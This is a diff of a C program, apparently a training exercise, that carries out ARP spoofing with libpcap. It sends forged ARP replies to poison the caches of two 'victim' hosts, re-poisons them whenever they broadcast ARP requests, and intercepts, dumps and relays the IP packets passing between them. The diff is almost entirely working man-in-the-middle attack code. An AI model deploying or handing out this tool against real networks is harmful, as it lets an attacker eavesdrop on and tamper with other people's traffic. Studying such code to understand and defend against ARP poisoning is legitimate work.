@@ -5,12 +5,14 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <string.h>
 #include <libnet.h>
 #include <pcap.h>
 #include "arp_spoofing.h"
 
-void str_to_ip(uint8_t * iparr, char * ipstr) {
+void str_to_ip(uint8_t * iparr, 
+               char * ipstr) {
     for(int i=0; i<4; i++){
         iparr[i] = atoi(ipstr);
         while(strncmp((const char *)ipstr, ".", 1) != 0)
@@ -19,7 +21,8 @@ void str_to_ip(uint8_t * iparr, char * ipstr) {
     }
 }
 
-int get_mac(uint8_t * my_mac, const char * interface) {
+int get_mac(uint8_t * my_mac, 
+            const char * interface) {
 	int sock_fd;
 	struct ifreq ifr;
     char buf[20];
@@ -58,7 +61,8 @@ int get_mac(uint8_t * my_mac, const char * interface) {
     return 0;
 }
 
-int get_ip(uint8_t * my_ip, const char * interface) {
+int get_ip(uint8_t * my_ip, 
+           const char * interface) {
     int sock_fd;
 	struct ifreq ifr;
 	struct sockaddr_in * sin;
@@ -90,7 +94,8 @@ int get_ip(uint8_t * my_ip, const char * interface) {
 	return 0;
 }
 
-void dump(const u_char * pkt, int size) {
+void dump(const u_char * pkt, 
+          int size) {
     for(int i=0; i<size; i++) {
         if (i % 16 == 0) printf("\n");
         printf("%02X ", pkt[i]);
@@ -98,7 +103,7 @@ void dump(const u_char * pkt, int size) {
 }
 
 void ARP_init(ARP_pkt * arp_pkt,
-              uint8_t * dst_mac,
+              uint8_t * eth_dst,
               uint8_t * eth_src,
               const uint16_t eth_type,
               const uint16_t arp_op,
@@ -107,7 +112,7 @@ void ARP_init(ARP_pkt * arp_pkt,
               uint8_t * t_hw_addr,
               uint8_t * t_p_addr) {
     // Ethernet
-    memcpy(arp_pkt->eh.dst, dst_mac, sizeof(arp_pkt->eh.dst));
+    memcpy(arp_pkt->eh.dst, eth_dst, sizeof(arp_pkt->eh.dst));
     memcpy(arp_pkt->eh.src, eth_src, sizeof(arp_pkt->eh.src));
     arp_pkt->eh.type = htons(eth_type);
 
@@ -123,7 +128,10 @@ void ARP_init(ARP_pkt * arp_pkt,
     memcpy(arp_pkt->ah.t_p_addr, t_p_addr, sizeof(arp_pkt->ah.t_p_addr));
 }
 
-void send_ARP_req(uint8_t * my_mac, uint8_t * my_ip, uint8_t * target_ip, pcap_t * handle) {
+void send_ARP_req(uint8_t * my_mac, 
+                  uint8_t * my_ip, 
+                  uint8_t * target_ip, 
+                  pcap_t * handle) {
     ARP_pkt * arp_req_broadcast = (ARP_pkt *)malloc(ARP_size);
     int result = 0;
     memset(arp_req_broadcast, 0, ARP_size);
@@ -139,12 +147,12 @@ void send_ARP_req(uint8_t * my_mac, uint8_t * my_ip, uint8_t * target_ip, pcap_t
 
     printf("[ ARP Request Packet ]");
     dump((const u_char *)arp_req_broadcast, ARP_size);
-    printf("\n\n");
+    printf("\n");
 
-    result = pcap_inject(handle, (uint8_t *)arp_req_broadcast, ARP_size);
-    printf("ahahahaha\n");
+    result = pcap_sendpacket(handle, (const u_char *)arp_req_broadcast, ARP_size);
+
     if (result == -1) {
-        pcap_perror(handle, "pcap_inject : ");
+        pcap_perror(handle, pcap_geterr(handle));
         exit(0);
     }
     free(arp_req_broadcast);
@@ -160,8 +168,6 @@ void recv_ARP_rep(uint8_t * target_ip, uint8_t * mac_buf, pcap_t * handle) {
         const u_char * packet;
         int result = pcap_next_ex(handle, &header, &packet);
 
-        memcpy(arp_rep_from_victim, packet, ARP_size);
-
         if (result == 0) { 
             perror("pcap_next_ex : "); 
             continue;
@@ -172,6 +178,9 @@ void recv_ARP_rep(uint8_t * target_ip, uint8_t * mac_buf, pcap_t * handle) {
             free(arp_rep_from_victim);
             exit(0);
         }
+
+        memcpy(arp_rep_from_victim, packet, ARP_size);
+
         if ( ntohs(arp_rep_from_victim->eh.type) != ETHERTYPE_ARP ) {
             continue;
         }
@@ -179,11 +188,12 @@ void recv_ARP_rep(uint8_t * target_ip, uint8_t * mac_buf, pcap_t * handle) {
                     (const u_char *)target_ip, 4) != 0) {
             continue;
         }
+        printf("\n");
         printf("[ Victim's ARP Reply Packet ]");
         dump((const u_char *)arp_rep_from_victim, ARP_size);
         printf("\n");
 
-        memcpy(arp_rep_from_victim->ah.s_hw_addr, mac_buf, 6);
+        memcpy(mac_buf, arp_rep_from_victim->ah.s_hw_addr, 6);
 
         free(arp_rep_from_victim);
         break;
@@ -213,89 +223,180 @@ void send_fake_ARP_rep(uint8_t * sender_mac,
     printf("\n");
 
     if (-1 == pcap_sendpacket(handle, (const u_char *)arp_rep_to_victim, ARP_size)) {
-        perror("pcap_sendpacket : ");
+        pcap_perror(handle, pcap_geterr(handle));
         exit(0);
     }
     
     free(arp_rep_to_victim);
 }
 
-void recv_spoofed_IP_pkt(uint8_t * sender_ip, pcap_t * handle, u_char * hdr_buf, u_char * payload_buf) {
-    IP_hdr * ip_spoofed_packet = (IP_hdr *)malloc(IP_size);
-    memset(ip_spoofed_packet, 0, IP_size);
-
+void spoof_and_relay(pcap_t * handle,
+                     uint8_t * my_mac,
+                     uint8_t * my_ip,
+                     uint8_t * sender_mac,
+                     uint8_t * sender_ip,
+                     uint8_t * receiver_mac,
+                     uint8_t * receiver_ip) {
     while(1) {
-        struct pcap_pkthdr * header;
-        const u_char * packet;
-        const u_char * payload;
-        int result = pcap_next_ex(handle, &header, &packet);
+        IP_hdr * tmp_ip_hdr = (IP_hdr *)malloc(IP_size);
+        memset(tmp_ip_hdr, 0, IP_size);
+        ARP_pkt * tmp_arp_pkt = (ARP_pkt *)malloc(ARP_size);
+        memset(tmp_arp_pkt, 0, ARP_size);
 
-        memcpy(ip_spoofed_packet, packet, IP_size);
-        payload = packet + IP_size;
+        struct pcap_pkthdr * header;
+        const uint8_t * packet;
+        const uint8_t * payload;
+        int result = pcap_next_ex(handle, &header, &packet);
 
         if (result == 0) { 
             perror("pcap_next_ex : "); 
+            free(tmp_arp_pkt);
+            free(tmp_ip_hdr);
             continue;
         }
         if (result == -1 || result == -2) { 
             perror("pcap_next_ex : "); 
             printf("please restart program\n");
-            free(ip_spoofed_packet);
+            free(tmp_ip_hdr);
+            free(tmp_arp_pkt);
             exit(0);
         }
-        if (ntohs(ip_spoofed_packet->eh.type) != ETHERTYPE_IP) {
+
+        // arp infection check
+        memcpy(tmp_arp_pkt, packet, ARP_size);
+        if (memcmp((const u_char *)tmp_arp_pkt->eh.dst, (const u_char *)BROADCAST, 6) == 0 &&
+            tmp_arp_pkt->eh.type == htons(ETHERTYPE_ARP) &&
+            tmp_arp_pkt->ah.op == htons(ARP_OP_REQ) ) {
+            
+            if (memcmp((const u_char *)tmp_arp_pkt->eh.src, (const u_char *)sender_mac, 6) == 0)
+                send_fake_ARP_rep(sender_mac, sender_ip, my_mac, my_ip, handle);
+            else if (memcmp((const u_char *)tmp_arp_pkt->eh.src, (const u_char *)receiver_mac, 6) == 0)
+                send_fake_ARP_rep(receiver_mac, receiver_ip, my_mac, my_ip, handle);
+        }
+        free(tmp_arp_pkt);
+
+        memcpy(tmp_ip_hdr, packet, IP_size);
+        const int header_len = tmp_ip_hdr->ih.hdr_len * 4;
+        const int payload_len = ntohs(tmp_ip_hdr->ih.total_len)-header_len;
+        const int total_len = header_len + payload_len;
+
+        uint8_t * relay_pkt = (uint8_t *)malloc(total_len);
+        uint8_t * ip_header = (uint8_t *)malloc(header_len);
+        uint8_t * ip_payload = (uint8_t *)malloc(payload_len);
+
+        if (ntohs(tmp_ip_hdr->eh.type) != ETHERTYPE_IP) {
+            free(tmp_ip_hdr);
+            free(relay_pkt);
+            free(ip_header);
+            free(ip_payload);
             continue;
         }
-        if ( memcmp((const u_char *)ip_spoofed_packet->ih.src_ip, 
-                    (const u_char *)sender_ip, 4) != 0) {
-            continue;
+
+        if (memcmp((const u_char *)tmp_ip_hdr->eh.src, (const u_char *)sender_mac, 6) == 0 &&
+            memcmp((const u_char *)tmp_ip_hdr->ih.dst_ip, (const u_char *)receiver_ip, 4) == 0) {
+            printf("\n=========================================================\n\n");
+            printf("[ Spoofed IP Packet from Sender ]\n");
+
+            printf("> Header\n");
+            printf("Header length : %d bytes", header_len);
+            dump(packet, header_len);
+            printf("\n");
+
+            printf("> Payload\n");
+            printf("Payload length : %d bytes", payload_len);
+            dump(packet+header_len, payload_len);
+            printf("\n");
+
+            memcpy(ip_header, packet, header_len);
+            payload = packet+header_len;
+            memcpy(ip_payload, payload, payload_len);
+
+            memcpy(tmp_ip_hdr->eh.dst, receiver_mac, 6);
+            memcpy(tmp_ip_hdr->eh.src, my_mac, 6);
+            
+            memcpy(ip_header, (const u_char *)tmp_ip_hdr, IP_size);
+            free(tmp_ip_hdr);
+
+            memcpy(relay_pkt, (const uint8_t *)ip_header, header_len);
+            memcpy(relay_pkt+header_len, (const uint8_t *)ip_payload, payload_len);
+
+            printf("\n**********************************************************\n\n");
+            printf("[ Relay IP Packet to Receiver ]\n");
+
+            printf("> Header\n");
+            printf("Payload length : %d bytes", header_len);
+            dump((const u_char *)relay_pkt, header_len);
+            printf("\n");
+
+            printf("> Payload\n");
+            printf("Payload length : %d bytes", payload_len);
+            dump((const u_char *)(relay_pkt+header_len), payload_len);
+            printf("\n");
+
+            if (-1 == pcap_sendpacket(handle, (const u_char *)relay_pkt, total_len)) {
+                perror("pcap_sendpacket : ");
+                exit(0);
+            }
+            printf("[+] Success to send to Receiver!\n");
+            printf("\n=========================================================\n\n");
+
         }
-        printf("[ Victim's Spoofed IP Packet ]\n");
-        printf("> Header\n");
-        dump((const u_char *)ip_spoofed_packet, IP_size);
-        printf("\n");
 
-        printf("> Payload\n");
-        dump(payload, strlen((const char *)payload));
-        printf("\n");
-        for(int i=0; i<strlen((const char *)payload); i++) {
-            printf("%c ", *(payload+i));
-            if(i % 0x10 == 0x0F) printf("\n");
+        else if (memcmp((const u_char *)tmp_ip_hdr->eh.src, (const u_char *)receiver_mac, 6) == 0 &&
+                 memcmp((const u_char *)tmp_ip_hdr->ih.dst_ip, (const u_char *)sender_ip, 4) == 0) {
+            printf("\n=========================================================\n\n");
+            printf("[ Spoofed IP Packet from Receiver ]\n");
+
+            printf("> Header\n");
+            printf("Header length : %d bytes", header_len);
+            dump(packet, header_len);
+            printf("\n");
+
+            printf("> Payload\n");
+            printf("Payload length : %d bytes", payload_len);
+            dump(packet+header_len, payload_len);
+            printf("\n");
+
+            memcpy(ip_header, packet, header_len);
+            payload = packet+header_len;
+            memcpy(ip_payload, payload, payload_len);
+
+            memcpy(tmp_ip_hdr->eh.dst, sender_mac, 6);
+            memcpy(tmp_ip_hdr->eh.src, my_mac, 6);
+
+            memcpy(ip_header, (const u_char *)tmp_ip_hdr, IP_size);
+            free(tmp_ip_hdr);
+
+            memcpy(relay_pkt, (const uint8_t *)ip_header, header_len);
+            memcpy(relay_pkt+header_len, (const uint8_t *)ip_payload, payload_len);
+
+            printf("\n**********************************************************\n\n");
+            printf("[ Relay IP Packet to Sender ]\n");
+
+            printf("> Header\n");
+            printf("Payload length : %d bytes", header_len);
+            dump((const u_char *)relay_pkt, header_len);
+            printf("\n");
+
+            printf("> Payload\n");
+            printf("Payload length : %d bytes", payload_len);
+            dump((const u_char *)(relay_pkt+header_len), payload_len);
+            printf("\n");
+
+            if (-1 == pcap_sendpacket(handle, (const u_char *)relay_pkt, total_len)) {
+                perror("pcap_sendpacket : ");
+                exit(0);
+            }
+            printf("[+] Success to send to Sender!\n\n");
+            printf("\n=========================================================\n\n");                 
+
         }
 
-        memcpy(hdr_buf, packet, IP_size);
-        memcpy(payload_buf, payload, strlen((const char *)payload));
-
-        free(ip_spoofed_packet);
-        break;
+        else {
+            free(tmp_ip_hdr);
+        }
+        free(relay_pkt);
+        free(ip_header);
+        free(ip_payload);
     }
 }
-
-void send_relay_pkt(uint8_t * src_mac,
-                    uint8_t * dst_mac,
-                    uint8_t * src_ip,
-                    uint8_t * dst_ip,
-                    pcap_t * handle,
-                    u_char * spoofed_pkt_hdr,
-                    u_char * spoofed_pkt_payload) { 
-    IP_hdr * ip_hdr = (IP_hdr *)malloc(IP_size);
-    memset(ip_hdr, 0, IP_size);
-    memcpy(ip_hdr, spoofed_pkt_hdr, IP_size);
-
-    u_char * relay_pkt = (u_char *)malloc(ip_hdr->ih.total_len);
-    memset(relay_pkt, 0, ip_hdr->ih.total_len);
-
-    memcpy(ip_hdr->eh.dst, dst_mac, sizeof(ip_hdr->eh.dst));
-    memcpy(ip_hdr->eh.src, src_mac, sizeof(ip_hdr->eh.src));
-    memcpy(relay_pkt+IP_size, spoofed_pkt_payload, ip_hdr->ih.total_len - IP_size);
-
-    printf("[ Relay IP Packet ]");
-    dump((const u_char *)relay_pkt, ip_hdr->ih.total_len);
-    printf("\n");
-
-    if (-1 == pcap_sendpacket(handle, (const u_char *)relay_pkt, ARP_size)) {
-        perror("pcap_sendpacket : ");
-        exit(0);
-    }
-    free(ip_hdr);
-}   
